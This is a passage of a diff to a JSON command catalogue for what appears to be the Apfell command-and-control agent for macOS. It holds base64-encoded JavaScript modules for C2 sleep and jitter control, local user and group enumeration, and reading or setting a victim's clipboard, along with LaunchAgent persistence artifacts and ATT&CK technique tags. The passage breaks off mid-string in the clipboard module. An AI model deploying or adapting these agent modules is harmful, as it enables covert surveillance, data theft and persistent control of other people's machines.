-              "replace_string": "*"
-            },
-            {
               "command_parameter": "LocalAgent",
               "artifact": "File Create",
               "artifact_string": "Created a ~\/Library\/LaunchAgent file: *",
+              "replace_string": "*"
+            },
+            {
+              "command_parameter": "LaunchPath",
+              "artifact": "File Create",
+              "artifact_string": "Potentially created \"*\" if we didn't create a launch agent file.",
               "replace_string": "*"
             }
           ],
@@ -1729,67 +1964,6 @@
             }
           ],
           "transforms": []
-        },
-        {
-          "needs_admin": false,
-          "help_cmd": "sleep {integer interval}",
-          "version": 2,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "Modify the time between callbacks in seconds.",
-          "cmd": "sleep",
-          "parameters": [
-            {
-              "type": "Number",
-              "hint": "",
-              "choices": "",
-              "required": false,
-              "name": "jitter"
-            },
-            {
-              "type": "Number",
-              "hint": "",
-              "choices": "",
-              "required": false,
-              "name": "interval"
-            }
-          ],
-          "attack": [
-            {
-              "t_num": "T1029",
-              "attack_name": "Scheduled Transfer"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "sleep.js": "ZXhwb3J0cy5zbGVlcCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKGNvbW1hbmRfcGFyYW1zLmhhc093blByb3BlcnR5KCdpbnRlcnZhbCcpICYmIGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddID49IDApewogICAgICAgICAgICBDMi5pbnRlcnZhbCA9IGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddOwogICAgICAgIH0KICAgICAgICBpZihjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgnaml0dGVyJykgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddID49IDAgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddIDw9IDEwMCl7CiAgICAgICAgICAgIEMyLmppdHRlciA9IGNvbW1hbmRfcGFyYW1zWydqaXR0ZXInXTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJTbGVlcCBpbnRlcnZhbCB1cGRhdGVkIHRvICIgKyBDMi5pbnRlcnZhbCArICIgYW5kIHNsZWVwIGppdHRlciB1cGRhdGVkIHRvICIgKyBDMi5qaXR0ZXIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CgpDT01NQU5EX0VORFNfSEVSRQ=="
-            }
-          ],
-          "transforms": [
-            {
-              "order": 1,
-              "parameter": "",
-              "active": true,
-              "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
-              "command": "sleep",
-              "command_id": 40,
-              "payload_type": "apfell-jxa",
-              "transform": "apfelljxa_sleep_shorthand",
-              "parameter_type": "None"
-            }
-          ]
         },
         {
           "needs_admin": false,
@@ -1893,7 +2067,7 @@
           "artifacts": [],
           "files": [
             {
-              "list_users.js": "ZXhwb3J0cy5saXN0X3VzZXJzID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKCWxldCBhbGxfdXNlcnMgPSBbXTsKCWxldCBtZXRob2QgPSAiYXBpIjsKCWxldCBnaWQgPSAtMTsKCWxldCBncm91cHMgPSBmYWxzZTsKCWlmKHBhcmFtcy5sZW5ndGggPiAwKXsKCSAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCdtZXRob2QnKSAmJiBkYXRhWydtZXRob2QnXSAhPT0gIiIpewogICAgICAgICAgICBtZXRob2QgPSBkYXRhWydtZXRob2QnXTsKICAgICAgICB9CiAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgnZ2lkJykgJiYgZGF0YVsnZ2lkJ10gIT09ICIiKXsKICAgICAgICAgICAgZ2lkID0gZGF0YVsnZ2lkJ107CiAgICAgICAgfQogICAgICAgIGlmKGRhdGEuaGFzT3duUHJvcGVydHkoImdyb3VwcyIpICYmIGRhdGFbJ2dyb3VwcyddICE9PSAiIil7CiAgICAgICAgICAgIGdyb3VwcyA9IGRhdGFbJ2dyb3VwcyddOwogICAgICAgIH0KCX0KICAgIGlmKG1ldGhvZCA9PT0gImFwaSIpewogICAgICAgIE9iakMuaW1wb3J0KCdDb2xsYWJvcmF0aW9uJyk7CiAgICAgICAgT2JqQy5pbXBvcnQoJ0NvcmVTZXJ2aWNlcycpOwogICAgICAgIC8vT2JqQy5iaW5kRnVuY3Rpb24oJ0NGTWFrZUNvbGxlY3RhYmxlJywgWydpZCcsIFsndm9pZConXV0pOwogICAgICAgIGlmKGdpZCA8IDApewogICAgICAgICAgICBsZXQgZGVmYXVsdEF1dGhvcml0eSA9ICQuQ1NHZXRMb2NhbElkZW50aXR5QXV0aG9yaXR5KCk7CiAgICAgICAgICAgIGxldCBpZGVudGl0eUNsYXNzID0gMjsKICAgICAgICAgICAgaWYoZ3JvdXBzKXsKICAgICAgICAgICAgICAgIGFsbF91c2VycyA9IHt9OyAvLyB3ZSB3aWxsIHdhbnQgdG8gZG8gYSBkaWN0aW9uYXJ5IHNvIHdlIGNhbiBncm91cCB0aGUgbWVtYmVycyBieSB0aGVpciBHSUQKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgaWRlbnRpdHlDbGFzcyA9IDE7IC8vZW51bWVyYXRlIHVzZXJzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbGV0IHF1ZXJ5ID0gJC5DU0lkZW50aXR5UXVlcnlDcmVhdGUoJCgpLCBpZGVudGl0eUNsYXNzLCBkZWZhdWx0QXV0aG9yaXR5KTsKICAgICAgICAgICAgbGV0IGVycm9yID0gUmVmKCk7CiAgICAgICAgICAgICQuQ1NJZGVudGl0eVF1ZXJ5RXhlY3V0ZShxdWVyeSwgMCwgZXJyb3IpOwogICAgICAgICAgICBsZXQgcmVzdWx0cyA9ICQuQ1NJZGVudGl0eVF1ZXJ5Q29weVJlc3VsdHMocXVlcnkpOwogICAgICAgICAgICBsZXQgbnVtUmVzdWx0cyA9IHBhcnNlSW50KCQuQ0ZBcnJheUdldENvdW50KHJlc3VsdHMpKTsKICAgICAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IG51bVJlc3VsdHM7IGkrKyl7CiAgICAgICAgICAgICAgICBsZXQgaWRlbnRpdHkgPSByZXN1bHRzLm9iamVjdEF0SW5kZXgoaSk7Ly9yZXN1bHRzW2ldOwogICAgICAgICAgICAgICAgbGV0IGlkT2JqID0gJC5DQklkZW50aXR5LmlkZW50aXR5V2l0aENTSWRlbnRpdHkoaWRlbnRpdHkpOwogICAgICAgICAgICAgICAgaWYoZ3JvdXBzKXsKICAgICAgICAgICAgICAgICAgICAvL2lmIHdlJ3JlIGxvb2tpbmcgYXQgZ3JvdXBzLCB0aGVuIHdlIGhhdmUgYSBkaWZmZXJlbnQgaW5mbyB0byBwcmludCBvdXQKICAgICAgICAgICAgICAgICAgICBhbGxfdXNlcnNbaWRPYmoucG9zaXhHSURdID0gW107CiAgICAgICAgICAgICAgICAgICAgbGV0IG1lbWJlcnMgPSBpZE9iai5tZW1iZXJJZGVudGl0aWVzLmpzOwogICAgICAgICAgICAgICAgICAgIGZvcihsZXQgaiA9IDA7IGogPCBtZW1iZXJzLmxlbmd0aDsgaisrKXsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGluZm8gPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUE9TSVhOYW1lIjogbWVtYmVyc1tqXS5wb3NpeE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUE9TSVhJRCI6ICBtZW1iZXJzW2pdLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogbWVtYmVyc1tqXS5hdXRob3JpdHkubG9jYWxpemVkTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJGdWxsTmFtZSI6IG1lbWJlcnNbal0uZnVsbE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRW1haWxzIjogIG1lbWJlcnNbal0uZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IG1lbWJlcnNbal0uaXNIaWRkZW4sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRW5hYmxlZCI6IG1lbWJlcnNbal0uaXNFbmFibGVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkFsaWFzZXMiOiBPYmpDLmRlZXBVbndyYXAobWVtYmVyc1tqXS5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogbWVtYmVyc1tqXS5VVUlEU3RyaW5nLmpzCiAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgIGFsbF91c2Vyc1tpZE9iai5wb3NpeEdJRF0ucHVzaChpbmZvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vycy5wdXNoKGluZm8pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIGxldCBkZWZhdWx0QXV0aG9yaXR5ID0gJC5DQklkZW50aXR5QXV0aG9yaXR5LmRlZmF1bHRJZGVudGl0eUF1dGhvcml0eTsKICAgICAgICAgICAgbGV0IGdyb3VwID0gJC5DQkdyb3VwSWRlbnRpdHkuZ3JvdXBJZGVudGl0eVdpdGhQb3NpeEdJREF1dGhvcml0eShnaWQsIGRlZmF1bHRBdXRob3JpdHkpOwogICAgICAgICAgICBsZXQgcmVzdWx0cyA9IGdyb3VwLm1lbWJlcklkZW50aXRpZXMuanM7CiAgICAgICAgICAgIGxldCBudW1SZXN1bHRzID0gcmVzdWx0cy5sZW5ndGg7CiAgICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBudW1SZXN1bHRzOyBpKyspewogICAgICAgICAgICAgICAgbGV0IGlkT2JqID0gcmVzdWx0c1tpXTsKICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgYWxsX3VzZXJzLnB1c2goaW5mbyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOkpTT04uc3RyaW5naWZ5KGFsbF91c2VycywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKCX0KCWVsc2V7CgkgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJNZXRob2Qgbm90IGtub3duIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KfTsKQ09NTUFORF9FTkRTX0hFUkUK"
+              "list_users.js": "ZXhwb3J0cy5saXN0X3VzZXJzID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKCWxldCBhbGxfdXNlcnMgPSBbXTsKCWxldCBtZXRob2QgPSAiYXBpIjsKCWxldCBnaWQgPSAtMTsKCWxldCBncm91cHMgPSBmYWxzZTsKCWlmKHBhcmFtcy5sZW5ndGggPiAwKXsKCSAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCdtZXRob2QnKSAmJiBkYXRhWydtZXRob2QnXSAhPT0gIiIpewogICAgICAgICAgICBtZXRob2QgPSBkYXRhWydtZXRob2QnXTsKICAgICAgICB9CiAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgnZ2lkJykgJiYgZGF0YVsnZ2lkJ10gIT09ICIiICYmIGRhdGFbJ2dpZCddID4gMCl7CiAgICAgICAgICAgIGdpZCA9IGRhdGFbJ2dpZCddOwogICAgICAgIH0KICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCJncm91cHMiKSAmJiBkYXRhWydncm91cHMnXSAhPT0gIiIpewogICAgICAgICAgICBncm91cHMgPSBkYXRhWydncm91cHMnXTsKICAgICAgICB9Cgl9CiAgICBpZihtZXRob2QgPT09ICJhcGkiKXsKICAgICAgICBPYmpDLmltcG9ydCgnQ29sbGFib3JhdGlvbicpOwogICAgICAgIE9iakMuaW1wb3J0KCdDb3JlU2VydmljZXMnKTsKICAgICAgICAvL09iakMuYmluZEZ1bmN0aW9uKCdDRk1ha2VDb2xsZWN0YWJsZScsIFsnaWQnLCBbJ3ZvaWQqJ11dKTsKICAgICAgICBpZihnaWQgPCAwKXsKICAgICAgICAgICAgbGV0IGRlZmF1bHRBdXRob3JpdHkgPSAkLkNTR2V0TG9jYWxJZGVudGl0eUF1dGhvcml0eSgpOwogICAgICAgICAgICBsZXQgaWRlbnRpdHlDbGFzcyA9IDI7CiAgICAgICAgICAgIGlmKGdyb3Vwcyl7CiAgICAgICAgICAgICAgICBhbGxfdXNlcnMgPSBbXTsgLy8gd2Ugd2lsbCB3YW50IHRvIGRvIGEgZGljdGlvbmFyeSBzbyB3ZSBjYW4gZ3JvdXAgdGhlIG1lbWJlcnMgYnkgdGhlaXIgR0lECiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgIGlkZW50aXR5Q2xhc3MgPSAxOyAvL2VudW1lcmF0ZSB1c2VycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxldCBxdWVyeSA9ICQuQ1NJZGVudGl0eVF1ZXJ5Q3JlYXRlKCQoKSwgaWRlbnRpdHlDbGFzcywgZGVmYXVsdEF1dGhvcml0eSk7CiAgICAgICAgICAgIGxldCBlcnJvciA9IFJlZigpOwogICAgICAgICAgICAkLkNTSWRlbnRpdHlRdWVyeUV4ZWN1dGUocXVlcnksIDAsIGVycm9yKTsKICAgICAgICAgICAgbGV0IHJlc3VsdHMgPSAkLkNTSWRlbnRpdHlRdWVyeUNvcHlSZXN1bHRzKHF1ZXJ5KTsKICAgICAgICAgICAgbGV0IG51bVJlc3VsdHMgPSBwYXJzZUludCgkLkNGQXJyYXlHZXRDb3VudChyZXN1bHRzKSk7CiAgICAgICAgICAgIGlmKHJlc3VsdHMuanMgPT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICByZXN1bHRzID0gJC5DRk1ha2VDb2xsZWN0YWJsZShyZXN1bHRzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgbnVtUmVzdWx0czsgaSsrKXsKICAgICAgICAgICAgICAgIGxldCBpZGVudGl0eSA9IHJlc3VsdHMub2JqZWN0QXRJbmRleChpKTsvL3Jlc3VsdHNbaV07CiAgICAgICAgICAgICAgICBsZXQgaWRPYmogPSAkLkNCSWRlbnRpdHkuaWRlbnRpdHlXaXRoQ1NJZGVudGl0eShpZGVudGl0eSk7CiAgICAgICAgICAgICAgICBpZihncm91cHMpewogICAgICAgICAgICAgICAgICAgIC8vaWYgd2UncmUgbG9va2luZyBhdCBncm91cHMsIHRoZW4gd2UgaGF2ZSBhIGRpZmZlcmVudCBpbmZvIHRvIHByaW50IG91dAogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vyc1tpXSA9IHt9OwogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vyc1tpXVsiUE9TSVhJRCJdID0gaWRPYmoucG9zaXhHSUQ7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydhbGlhc2VzJ10gPSBPYmpDLmRlZXBVbndyYXAoaWRPYmouYWxpYXNlcyk7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydmdWxsTmFtZSddID0gT2JqQy5kZWVwVW53cmFwKGlkT2JqLmZ1bGxOYW1lKTsKICAgICAgICAgICAgICAgICAgICBhbGxfdXNlcnNbaV1bJ1BPU0lYTmFtZSddID0gT2JqQy5kZWVwVW53cmFwKGlkT2JqLnBvc2l4TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydtZW1iZXJzJ10gPSBbXTsKICAgICAgICAgICAgICAgICAgICBsZXQgbWVtYmVycyA9IGlkT2JqLm1lbWJlcklkZW50aXRpZXMuanM7CiAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqID0gMDsgaiA8IG1lbWJlcnMubGVuZ3RoOyBqKyspewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW5mbyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWE5hbWUiOiBtZW1iZXJzW2pdLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIG1lbWJlcnNbal0ucG9zaXhVSUQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiTG9jYWxBdXRob3JpdHkiOiBtZW1iZXJzW2pdLmF1dGhvcml0eS5sb2NhbGl6ZWROYW1lLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkZ1bGxOYW1lIjogbWVtYmVyc1tqXS5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgbWVtYmVyc1tqXS5lbWFpbEFkZHJlc3MuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaXNIaWRkZW5BY2NvdW50IjogbWVtYmVyc1tqXS5pc0hpZGRlbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbmFibGVkIjogbWVtYmVyc1tqXS5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChtZW1iZXJzW2pdLmFsaWFzZXMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVVSUQiOiBtZW1iZXJzW2pdLlVVSURTdHJpbmcuanMKICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydtZW1iZXJzJ10ucHVzaChpbmZvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vycy5wdXNoKGluZm8pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIGxldCBkZWZhdWx0QXV0aG9yaXR5ID0gJC5DQklkZW50aXR5QXV0aG9yaXR5LmRlZmF1bHRJZGVudGl0eUF1dGhvcml0eTsKICAgICAgICAgICAgbGV0IGdyb3VwID0gJC5DQkdyb3VwSWRlbnRpdHkuZ3JvdXBJZGVudGl0eVdpdGhQb3NpeEdJREF1dGhvcml0eShnaWQsIGRlZmF1bHRBdXRob3JpdHkpOwogICAgICAgICAgICBsZXQgcmVzdWx0cyA9IGdyb3VwLm1lbWJlcklkZW50aXRpZXMuanM7CiAgICAgICAgICAgIGxldCBudW1SZXN1bHRzID0gcmVzdWx0cy5sZW5ndGg7CiAgICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBudW1SZXN1bHRzOyBpKyspewogICAgICAgICAgICAgICAgbGV0IGlkT2JqID0gcmVzdWx0c1tpXTsKICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgYWxsX3VzZXJzLnB1c2goaW5mbyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOkpTT04uc3RyaW5naWZ5KGFsbF91c2VycywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKCX0KCWVsc2V7CgkgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJNZXRob2Qgbm90IGtub3duIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KfTsKQ09NTUFORF9FTkRTX0hFUkUK"
             }
           ],
           "transforms": []
@@ -1930,13 +2104,13 @@
             {
               "command_parameter": "null",
               "artifact": "Process Create",
-              "artifact_string": "bundle launched (executed by user)",
+              "artifact_string": "xpcproxy * (executed by launchd)",
               "replace_string": "*"
             },
             {
               "command_parameter": "null",
               "artifact": "Process Create",
-              "artifact_string": "xpcproxy * (executed by launchd)",
+              "artifact_string": "bundle launched (executed by user)",
               "replace_string": "*"
             }
           ],
@@ -1951,9 +2125,9 @@
               "parameter": "bundle",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "launchapp",
-              "command_id": 46,
+              "command_id": 57,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
@@ -2005,47 +2179,14 @@
               "parameter": "command",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "jscript",
-              "command_id": 47,
+              "command_id": 58,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
             }
           ]
-        },
-        {
-          "needs_admin": false,
-          "help_cmd": "clipboard [data]",
-          "version": 3,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "This will return the current clipboard contents on the target machine. If [data] is supplied, it will set the clipboard to [data].",
-          "cmd": "clipboard",
-          "parameters": [],
-          "attack": [
-            {
-              "t_num": "T1115",
-              "attack_name": "Clipboard Data"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "clipboard.js": "ZXhwb3J0cy5jbGlwYm9hcmQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgbGV0IHJlc3BvbnNlID0gIiI7CiAgICBPYmpDLmltcG9ydCgnQXBwS2l0Jyk7CiAgICBpZihwYXJhbXMgIT09IHVuZGVmaW5lZCAmJiBwYXJhbXMgIT09ICIiKXsKICAgICAgICAvLyBUcnkgc2V0dGluZyB0aGUgY2xpcGJvYXJkIHRvIHdoYXRldmVyIGlzIGluIHBhcmFtcwogICAgICAgIHRyeXsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuY2xlYXJDb250ZW50czsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuc2V0U3RyaW5nRm9yVHlwZSgkKHBhcmFtcyksICQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZyk7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIlN1Y2Nlc3NmdWxseSBzZXQgdGhlIGNsaXBib2FyZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIC8vdHJ5IGp1c3QgcmVhZGluZyB0aGUgY2xpcGJvYXJkIGRhdGEgYW5kIHJldHVybmluZyBpdAogICAgICAgIHRyeX